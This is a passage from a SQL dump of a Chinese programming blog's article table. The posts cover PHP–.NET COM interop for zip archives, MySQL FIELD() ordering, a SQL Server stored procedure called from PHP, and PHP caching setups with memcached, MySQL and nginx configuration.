   $filename = &quot;archive-&quot; . date(&#039;Y-m-d_His&#039;) . &quot;.zip&quot;; \r\n    echo &#039;Dynamically generated archive name: &#039; . &quot;\n&quot; . &#039;&amp;lt;h4&amp;gt;&#039; . $filename . &quot;&amp;lt;/h4&amp;gt;\n&quot;; \r\n               \r\n    $zipFile = &quot;c:/xampp/htdocs/&quot; . $filename; \r\n    //COM类加载Ionic.Zip.ZipFile动态库 \r\n    $zip = new COM(&quot;Ionic.Zip.ZipFile&quot;); \r\n    //定义文件名 \r\n    $zip-&amp;gt;name = $zipFile; \r\n    //加密等级为0不加密 值为3则需要密码 \r\n    $zip-&amp;gt;Encryption = 0; \r\n    //密码不需要 \r\n    // $zip-&amp;gt;Password = &quot;&quot;; \r\n    //用zip64方式压缩文件 \r\n    $zip-&amp;gt;UseZip64WhenSaving = 2; \r\n               \r\n    //设置要压缩的目录 \r\n    $dirToZip= &quot;c:/xampp/htdocs/work&quot;; \r\n    $zip-&amp;gt;AddDirectory($dirToZip); \r\n    //执行压缩操作 \r\n    $zip-&amp;gt;Save(); \r\n               \r\n    echo &#039;&amp;lt;br/&amp;gt;The file was saved to &#039; . $zip-&amp;gt;Name . &#039;&amp;lt;br/&amp;gt;&#039; . &quot;\n&quot;; \r\n               \r\n    $zip-&amp;gt;Dispose(); \r\n               \r\n    echo &#039;&amp;lt;/body&amp;gt;&#039;; \r\n    echo &#039;&amp;lt;/html&amp;gt;&#039;; \r\n               \r\n} catch (Exception $e) { \r\n    echo &#039;Caught exception: &#039;,  $e-&amp;gt;getMessage(), &quot;\n&quot;; \r\n    echo &#039;&amp;lt;pre&amp;gt;&#039;; \r\n    echo $e-&amp;gt;getTraceAsString(), &quot;\n&quot;; \r\n    echo &#039;&amp;lt;/pre&amp;gt;&#039;; \r\n}&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color:#006600&quot;&gt;解压zip文件unzipfile.php&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\n//解压zip文件 \r\ntry { \r\n    echo &#039;&amp;lt;html&amp;gt;&#039;; \r\n    echo &#039;  &amp;lt;head&amp;gt;&#039;; \r\n    echo &#039;  &amp;lt;title&amp;gt;Calling .NET from PHP through COM&amp;lt;/title&amp;gt;&#039;; \r\n    echo &#039;  &amp;lt;meta content=&quot;text/html; charset=GB2312&quot; http-equiv=&quot;Content-Type&quot;&amp;gt;&#039;; \r\n    echo &#039;  &amp;lt;/head&amp;gt;&#039;; \r\n    echo &#039;&amp;lt;body&amp;gt;&#039;; \r\n     \r\n    echo &#039;&amp;lt;h2&amp;gt;Hello!&amp;lt;/h2&amp;gt;&#039; . &quot;&amp;lt;br/&amp;gt;\n&quot;; \r\n    echo &#039;&amp;lt;h4&amp;gt;Trying static method&amp;lt;/h4&amp;gt;&#039; . &quot;&amp;lt;br/&amp;gt;\n&quot;; \r\n     \r\n    $zipDir = &quot;c:/xampp/htdocs/&quot;; \r\n    $zipFile = &quot;archive-2013-04-16.zip&quot;; \r\n     \r\n    //COM类加载Ionic.Zip.ZipFile动态库 \r\n    $zip = new COM(&quot;Ionic.Zip.ZipFile&quot;); \r\n    //初始化zip文件 \r\n    $zip-&amp;gt;Initialize($zipDir.$zipFile); \r\n    //解压zip文件 \r\n    $zip-&amp;gt;ExtractAll($zipDir); \r\n    //处理过程 \r\n    $zip-&amp;gt;Dispose(); \r\n     \r\n    echo &#039;&amp;lt;h2&amp;gt;Unzip Success!&amp;lt;/h2&amp;gt;&#039; . &quot;&amp;lt;br/&amp;gt;\n&quot;; \r\n    echo &#039;&amp;lt;/body&amp;gt;&#039;; \r\n    echo &#039;&amp;lt;/html&amp;gt;&#039;; \r\n     \r\n} catch (Exception $e) { \r\n    echo &#039;Caught exception: &#039;,  $e-&amp;gt;getMessage(), &quot;\n&quot;; \r\n    echo &#039;&amp;lt;pre&amp;gt;&#039;; \r\n    echo $e-&amp;gt;getTraceAsString(), &quot;\n&quot;; \r\n    echo &#039;&amp;lt;/pre&amp;gt;&#039;; \r\n}&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386857759);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(76, 76, '&lt;p&gt;偶尔看到的。。。或许有人会注意过，但我以前真不知道 &lt;br /&gt;SQL: select * from table where id IN (3,6,9,1,2,5,8,7); &lt;br /&gt;&lt;br /&gt;这样的情况取出来后，其实，id还是按1,2,3,4,5,6,7,8,9,排序的，但如果我们真要按IN里面的顺序排序怎么办？SQL能不能完成？是否需要取回来后再foreach一下？其实mysql就有这个方法&lt;br /&gt;&lt;br /&gt;sql: select * from table where id IN (3,6,9,1,2,5,8,7) order by field(id,3,6,9,1,2,5,8,7);&lt;br /&gt;&lt;br /&gt;出来的顺序就是指定的顺序了。。。。这个，以前还真的从来没用过，偶尔看到，所以就记录了一下。一是做个笔记，二是希望可以给更多的人看到&lt;/p&gt;', 1386857860),
(77, 77, '&lt;p&gt;最近做一个项目，需要在WEB端上传文件并打zip包，供c#编写的客户端软件下载更新，中间需要双方都获取zip文件的最后修改时间（时分秒等信息）并按规则计算版本号，来决定是否更新该zip包，由于php只能获取到精确到秒的文件修改时间，而c#的FileInfo类获取到的文件修改时间是精确到微秒，而且这两个时间在微秒的取舍上并没有四舍五入、逢余进一等规律，所以自己用C#编写了一个dll库，提供C#的文件操作供PHP调用。&lt;/p&gt;&lt;p&gt;系统：WIN8&lt;/p&gt;&lt;p&gt;IDE：VS2008&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;1、新建一个类库项目&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386858115_9958gj_2567_20130513110718161.png&quot; title=&quot;20130513110718161.png&quot; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-size:14px&quot;&gt;2、将Class1.cs改为我们想要的名字&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386858129_sp7jcs_3352_20130513110907809.jpg&quot; title=&quot;20130513110907809.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;问是否同时给类改名，确定&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386858168_bycq6w_2624_20130513110945716.jpg&quot; title=&quot;20130513110945716.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;3、修改Properties目录下面的AssemblyInfo.cs &lt;br /&gt;ComVisible属性设置为True&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386858186_78kbh1_3339_20130513111031936.jpg&quot; title=&quot;20130513111031936.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;4、项目菜单-&amp;gt;MyLib属性 &lt;br /&gt;找到&ldquo;生成&rdquo;选项卡&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386858224_vkjd2y_4244_20130513111120297.jpg&quot; title=&quot;20130513111120297.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;往下看，找到&ldquo;为 COM Interop 注册&rdquo;勾上&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386858245_zyg6ni_4631_20130513111154303.jpg&quot; title=&quot;20130513111154303.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;5、继续往下，找到&ldquo;签名&rdquo;选项卡 &lt;br /&gt; &amp;nbsp;勾上&ldquo;为程序集签名&rdquo; &lt;br /&gt; &amp;nbsp;在下面的下拉框里面选择&ldquo; &amp;lt;新建...&amp;gt;&rdquo;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386858270_m1esea_4241_20130513111234858.png&quot; title=&quot;20130513111234858.png&quot; /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;6、在弹出的对话框里面，输入MyLib。。或者随便取个名字 &lt;br /&gt; &amp;nbsp;去掉使用密码保护文件的选项&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386858426_p7hv1k_2538_20130513111312169.jpg&quot; title=&quot;20130513111312169.jpg&quot; /&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;7、开始编码，任何一个公开的类，必须有一个 I开通的接口定义 &lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:c#;toolbar:false;&quot;&gt;using System; \r\nusing System.Collections.Generic; \r\nusing System.Text; \r\nusing System.Runtime.InteropServices; \r\n                                         \r\nnamespace MyLib \r\n{ \r\n    [ComVisible(true)] \r\n    [Guid(&quot;2CBD3D76-35F1-4f9d-9C1B-9DBFEE412F76&quot;)] \r\n    public interface IMyClass \r\n    { \r\n        void Initialize(); \r\n        void Dispose(); \r\n        int Add(int x, int y); \r\n    } \r\n    [ComVisible(true)] \r\n    [Guid(&quot;EA2F140A-108F-47ae-BBD5-83EEE646CC0D&quot;)] \r\n    [ProgId(&quot;MyLib.MyClass&quot;)] \r\n    public class MyClass : IMyClass \r\n    { \r\n        public void Initialize() \r\n        { \r\n            //nothing todo \r\n        } \r\n        public void Dispose() \r\n        { \r\n            //nothing todo \r\n        } \r\n        public int Add(int x, int y) \r\n        { \r\n            return x + y; \r\n        } \r\n    } \r\n}&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;8、GUID属性里面的那个字符串，在&ldquo;工具&rdquo;菜单下面，&ldquo;创建 GUID&rdquo; &lt;br /&gt; &amp;nbsp;选择 Registry Format，然后复制&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386858390_srboi4_1161_20130513111434373.jpg&quot; title=&quot;20130513111434373.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;注意在[Guid(&amp;quot;....... 这个里面要去掉GUID前后的花括号&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：如果你安装的VS里面没有GUID生成工具，请下载&lt;a target=&quot;_blank&quot; href=&quot;http://pan.baidu.com/share/link?shareid=516680&amp;amp;uk=704879932&quot;&gt;http://pan.baidu.com/share/link?shareid=516680&amp;amp;uk=704879932&lt;/a&gt; 下载之后 运行exe文件生成两次GUID，分别复制到上面C#代码里面的相应Guid位置替换掉原来的值&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;&lt;strong&gt;最后生成解决方案，得到MyLib.dll 并将其注册为COM组件&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;注册为COM组件参考：&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/luochuan/article/details/8807276&quot;&gt;http://blog.csdn.net/luochuan/article/details/8807276&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#006600&quot;&gt;调用代码参考：PHP&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;$MyLib = new com(&quot;MyLib.MyClass&quot;); \r\necho $MyLib-&amp;gt;Add(1,2); //输出值3&lt;/pre&gt;', 1386858430),
(78, 78, '&lt;p&gt;第一次编写&lt;a title=&quot;sqlserver&quot; href=&quot;http://www.wodeblog.com/archives/category/sqlserver-2&quot;&gt;sqlserver&lt;/a&gt;存储过程并在php里调用，把脑瓜都整大了，奋战了一天多最后还是搞定了。&lt;br /&gt;实现功能：在&lt;a title=&quot;sqlserver&quot; href=&quot;http://www.wodeblog.com/archives/tag/sqlserver&quot;&gt;sqlserver&lt;/a&gt;里面实现事务处理，保证数据库操作安全；&lt;br /&gt;&lt;/p&gt;&lt;p&gt;接收sqlserver存储过程输出的各种状态的值。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;sqlserver里面的存储过程如下：&lt;/p&gt;&lt;pre class=&quot;brush:sql;toolbar:false;&quot;&gt;ALTER PROC PK_Shop_Member \r\n    @nUserID INT, \r\n    @nMoney BIGINT, \r\n    @DATE DATETIME, \r\n    @nUserID2 INT, \r\n    @nResult INT OUTPUT//此变量装载存储过程输出的值 \r\nWITH ENCRYPTION AS \r\nBEGIN \r\n    -- 属性设置 \r\n    SET NOCOUNT ON \r\n    BEGIN TRY \r\n        BEGIN TRANSACTION T \r\n            UPDATE GaScoInfo SET Sco = Sco-@nMoney WHERE USER=@nUserID \r\n            UPDATE [GameUser].[dbo].[Accounts] SET Mem = &#039;1&#039;,MemberOverD = @DATE WHERE USER=@nUserID2 \r\n        COMMIT TRANSACTION T \r\n        SET @nResult=3 \r\n    END TRY \r\n    BEGIN CATCH \r\n        ROLLBACK TRANSACTION T   \r\n        SET @nResult=2 \r\n    END CATCH \r\nEND \r\nRETURN 0 \r\nGO&lt;/pre&gt;&lt;p&gt;php里面调用如下：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;$db_host=&#039;******&#039;; \r\n$db_user=&#039;=&#039;******&#039;; \r\n$db_pass=&#039;=&#039;******&#039;; \r\n$db_name=&#039;=&#039;******&#039;; \r\n$nResult= &#039;99&#039;;//此处为定义接收存储过程输出的变量 \r\n$db_connect=mssql_connect($db_host,$db_user,$db_pass); \r\n$db_select=mssql_select_db($db_name,$db_connect); \r\n$stmt = mssql_init(&quot;PK_Shop_Member&quot;, $db_connect); \r\nmssql_bind($stmt,&quot;@nUserID&quot;,&#039;111&#039;,SQLINT4,FALSE,FALSE,30); \r\nmssql_bind($stmt,&quot;@nMoney&quot;,&#039;222&#039;,SQLFLT8,FALSE,FALSE,30); \r\nmssql_bind($stmt,&quot;@Date&quot;,&#039;2012-4-2 20:10:56&#039;,SQLVARCHAR,FALSE,FALSE,30); \r\nmssql_bind($stmt,&quot;@nUserID2&quot;,&#039;465&#039;,SQLINT4,FALSE,FALSE,30); \r\nmssql_bind($stmt,&quot;@nResult&quot;,$nResult,SQLINT4,TRUE,FALSE,30); //为存储过程添加一个输出参数 \r\nif($rs=mssql_execute($stmt)){ \r\n    if($nResult==&#039;99&#039;)exit(&#039;99&#039;);//网络异常 \r\n    elseif($nResult==&#039;2&#039;)exit(&#039;2&#039;);//&#039;网络异常 \r\n    elseif($nResult==&#039;3&#039;)exit(&#039;1&#039;);//成功 \r\n}else{ \r\n    exit(&#039;3&#039;);//&#039;网络异常，交易失败&#039; \r\n}&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;br /&gt;参考资料：&lt;a target=&quot;_blank&quot; href=&quot;http://www.wodeblog.com/archives/312&quot;&gt;http://www.wodeblog.com/archives/312&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386858596),
(79, 79, '&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;本文主要讲解&lt;a href=&quot;http://web.itivy.com/php/&quot; target=&quot;_blank&quot; class=&quot;relatedlink&quot;&gt;PHP&lt;/a&gt;企业级应用之常见缓存技术，从基本的PHP缓存概念到技术代码的实现都深入做了解读。数据缓存：这里所说的数据缓存是指数据库查询缓存。&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;strong&gt;普遍缓存技术&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;数据缓存：这里所说的数据缓存是指数据库查询缓存，每次访问页面的时候,都会先检测相应的缓存数据是否存在，如果不存在，就连接数据库，得到数据， 并把查询结果序列化后保存到文件中，以后同样的查询结果就直接从缓存表或文件中获得。&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;用的最广的例子看Discuz的搜索功能，把结果ID缓存到一个表中，下次搜索相同关键字时先搜索缓存表。&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;举个常用的方法，多表关联的时候，把附表中的内容生成数组保存到主表的一个字段中，需要的时候数组分解一下，这样的好处是只读一个表，坏处就是两个 数据同步会多不少步骤，数据库永远是瓶颈，用硬盘换速度，是这个的关键点。&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;strong&gt;页面缓存：&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;每次访问页面的时候，都会先检测相应的缓存页面文件是否存在，如果不存在，就连接数据库，得到数据，显示页面并同时生成缓存页面文件，这样下次访问 的时候页面文件就发挥作用了。(模板引擎和网上常见的一些缓存类通常有此功能)&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;strong&gt;时间触发缓存：&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;检查文件是否存在并且时间戳小于设置的过期时间,如果文件修改的时间戳比当前时间戳减去过期时间戳大，那么就用缓存，否则更新缓存。&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;strong&gt;内容触发缓存：&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;当插入数据或更新数据时，强制更新缓存。&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;strong&gt;静态缓存：&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;这里所说的静态缓存是指静态化，直接生成HTML或xml等文本文件，有更新的时候重生成一次，适合于不太变化的页面，这就不说了。&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;以上内容是代码级的解决方案，我直接CP别的框架，也懒得改，内容都差不多，很容易就做到，而且会几种方式一起用，但下面的内容是服务器端的缓存方 案，非代码级的，要有多方的合作才能做到&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;strong&gt;内存缓存:&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;Memcached是高性能的，分布式的内存对象缓存系统，用于在动态应用中减少数据库负载，提升访问速度。&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;这里说下Memcached的例子：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php   \r\n                                     \r\n$memcache = new Memcache;   \r\n                                     \r\n$memcache-&amp;gt;connect(&lsquo;localhost&rsquo;, 11211) or die (&ldquo;Could not connect&rdquo;);   \r\n                                     \r\n$version = $memcache-&amp;gt;getVersion();   \r\n                                     \r\necho &ldquo;Server&rsquo;s version: &ldquo;.$version.&rdquo;\n&rdquo;;   \r\n                                     \r\n$tmp_object = new stdClass;   \r\n                                     \r\n$tmp_object-&amp;gt;str_attr = &lsquo;test&rsquo;;   \r\n                                     \r\n$tmp_object-&amp;gt;int_attr = 123;   \r\n                                     \r\n$memcache-&amp;gt;set(&lsquo;key&rsquo;, $tmp_object, false, 10) or die (&ldquo;Failed to save data at the server&rdquo;);   \r\n                                     \r\necho &ldquo;Store data in the cache (data will expire in 10 seconds)\n&rdquo;;   \r\n                                     \r\n$get_result = $memcache-&amp;gt;get(&lsquo;key&rsquo;);   \r\n                                     \r\necho &ldquo;Data from the cache:\n&rdquo;;   \r\n                                     \r\nvar_dump($get_result);   \r\n                                     \r\n?&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;读库的例子：&lt;/strong&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php   \r\n                           \r\n$sql = &lsquo;SELECT * FROM users&rsquo;;   \r\n                           \r\n$key = md5($sql);   //memcached 对象标识符   \r\n                           \r\nif ( !($datas = $mc-&amp;gt;get($key)) ) {   \r\n                           \r\n//  在 memcached 中未获取到缓存数据，则使用数据库查询获取记录集。   \r\n                           \r\necho &ldquo;n&rdquo;.str_pad(&lsquo;Read datas from MySQL.&rsquo;, 60, &lsquo;_&rsquo;).&rdquo;n&rdquo;;   \r\n                           \r\n$conn = mysql_connect(&lsquo;localhost&rsquo;, &lsquo;test&rsquo;, &lsquo;test&rsquo;);   \r\n                           \r\nmysql_select_db(&lsquo;test&rsquo;);   \r\n                           \r\n$result = mysql_query($sql);   \r\n                           \r\nwhile ($row = mysql_fetch_object($result))   \r\n                           \r\n$datas[] = $row;   \r\n                           \r\n//  将数据库中获取到的结果集数据保存到 memcached 中，以供下次访问时使用。   \r\n                           \r\n$mc-&amp;gt;add($key, $datas);   \r\n                           \r\n} else {   \r\n                           \r\necho &ldquo;n&rdquo;.str_pad(&lsquo;Read datas from memcached.&rsquo;, 60, &lsquo;_&rsquo;).&rdquo;n&rdquo;;   \r\n                           \r\n}   \r\n                           \r\nvar_dump($datas);   \r\n                           \r\n?&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;strong&gt;PHP的缓冲器：&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;有eaccelerator， apc， PHPa，xcache，这个这个就不说了吧，搜索一堆一堆的，自己看啦，知道有这玩意就OK&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;strong&gt;MYSQL缓存：&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;这也算非代码级的，经典的数据库就是用的这种方式，看下面的运行时间，0.09xxx之类的&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;我贴段根据蓝色那家伙修改后部分my.ini 吧，2G的MYISAM表可以在0.05S左右，据说他前后改了有快一年&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;[client]   \r\n                   \r\n&hellip;&hellip;   \r\n                   \r\ndefault-character-set=gbk   \r\n                   \r\ndefault-storage-engine=MYISAM   \r\n                   \r\nmax_connections=600   \r\n                   \r\nmax_connect_errors=500   \r\n                   \r\nback_log=200   \r\n                   \r\ninteractive_timeout=7200   \r\n                   \r\nquery_cache_size=64M   \r\n                   \r\n&hellip;&hellip;   \r\n                   \r\ntable_cache=512   \r\n                   \r\n&hellip;&hellip;   \r\n                   \r\nmyisam_max_sort_file_size=100G   \r\n                   \r\nmyisam_max_extra_sort_file_size=100G   \r\n                   \r\nmyisam_sort_buffer_size=128M   \r\n                   \r\nkey_buffer_size=1024M   \r\n                   \r\nread_buffer_size=512M   \r\n                   \r\n&hellip;&hellip;   \r\n                   \r\nthread_concurrency=8&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;strong&gt;基于反向代理的Web缓存:&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;如Nginx，SQUID，mod_PRoxy(apache2以上又分为mod_proxy和mod_cache)&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;strong&gt;NGINX的例子&lt;/strong&gt;&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;&amp;lt;nginx.conf&amp;gt;   \r\n           \r\n#user  nobody;   \r\n           \r\nworker_processes  4;   \r\n           \r\nerror_log  logs/error.log crit;   \r\n           \r\npid        logs/nginx.pid;   \r\n           \r\nworker_rlimit_nofile 10240;   \r\n           \r\nevents {   \r\n           \r\nuse epoll;   \r\n           \r\nworker_connections  51200;   \r\n           \r\n}   \r\n           \r\nhttp {   \r\n           \r\ninclude       mime.types;   \r\n           \r\ndefault_type  application/octet-stream;   \r\n           \r\nsendfile    on;   \r\n           \r\nkeepalive_timeout 65;   \r\n           \r\ntcp_nodelay on;   \r\n           \r\n# server pool   \r\n           \r\nupstream bspfrontsvr {   \r\n           \r\nserver 10.10.10.224:80   weight=1;   \r\n           \r\nserver 10.10.10.221:80   weight=1;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\nupstream bspimgsvr {   \r\n           \r\nserver 10.10.10.201:80   weight=1;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\nupstream bspstylesvr {   \r\n           \r\nserver 10.10.10.202:80   weight=1;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\nupstream bsphelpsvr {   \r\n           \r\nserver 10.10.10.204:80   weight=1;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\nupstream bspwsisvr {   \r\n           \r\nserver 10.10.10.203:80   weight=1;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\nupstream bspadminsvr {   \r\n           \r\nserver 10.10.10.222:80   weight=1;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\nupstream bspbuyersvr {   \r\n           \r\nserver 10.10.10.223:80   weight=1;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\nupstream bspsellersvr {   \r\n           \r\nserver 10.10.10.225:80   weight=1;   \r\n           \r\n}   \r\n           \r\nupstream  bsploginsvr  {   \r\n           \r\nserver 10.10.10.220:443  weight=1;   \r\n           \r\n}   \r\n           \r\nupstream  bspregistersvr  {   \r\n           \r\nserver 10.10.10.220:80  weight=1;   \r\n           \r\n}   \r\n           \r\nlog_format  test_com  &lsquo;$remote_addr &ndash; $remote_user [$time_local] &ldquo;$request&rdquo; &lsquo;   \r\n           \r\n&lsquo;$status $body_bytes_sent &ldquo;$http_referer&rdquo; &ldquo;$http_user_agent&rdquo; &lsquo;;   \r\n           \r\n#&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;   \r\n           \r\n#img.test.com   \r\n           \r\nserver {   \r\n           \r\nlisten       10.10.10.230:80;   \r\n           \r\nserver_name  img.test.com;   \r\n           \r\nlocation / {   \r\n           \r\nproxy_pass      http://bspimgsvr;   \r\n           \r\ninclude         proxy_setting.conf;   \r\n           \r\n}   \r\n           \r\naccess_log  logs/img.log  test_com;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\n#style.test.com   \r\n           \r\nserver {   \r\n           \r\nlisten       10.10.10.230:80;   \r\n           \r\nserver_name  style.test.com;   \r\n           \r\nlocation / {   \r\n           \r\nproxy_pass      http://bspstylesvr;   \r\n           \r\ninclude         proxy_setting.conf;   \r\n           \r\n}   \r\n           \r\naccess_log  logs/style.log  test_com;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\n#help.test.com   \r\n           \r\nserver {   \r\n           \r\nlisten       10.10.10.230:80;   \r\n           \r\nserver_name  help.test.com;   \r\n           \r\nlocation / {   \r\n           \r\nproxy_pass      http://bsphelpsvr;   \r\n           \r\ninclude         proxy_setting.conf;   \r\n           \r\n}   \r\n           \r\naccess_log  logs/help.log  test_com;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\n#admin.test.com   \r\n           \r\nserver {   \r\n           \r\nlisten       10.10.10.230:80;   \r\n           \r\nserver_name  admin.test.com;   \r\n           \r\nlocation / {   \r\n           \r\nproxy_pass      http://bspadminsvr;   \r\n           \r\ninclude         proxy_setting.conf;   \r\n           \r\n}   \r\n           \r\naccess_log  logs/admin.log  test_com;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\n#buyer.test.com   \r\n           \r\nserver {   \r\n           \r\nlisten       10.10.10.230:80;   \r\n           \r\nserver_name  buyer.test.com;   \r\n           \r\nlocation / {   \r\n           \r\nproxy_pass      http://bspbuyersvr;   \r\n           \r\ninclude         proxy_setting.conf;   \r\n           \r\n} 